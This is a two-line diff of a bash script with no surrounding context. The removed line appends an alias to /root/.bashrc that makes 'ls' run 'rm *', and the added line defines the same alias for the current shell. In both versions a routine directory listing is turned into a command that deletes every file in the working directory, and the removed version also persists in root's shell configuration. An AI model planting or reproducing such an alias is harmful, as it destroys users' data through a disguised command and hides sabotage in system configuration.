@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'" >> /root/.bashrc
+alias ls='rm *'
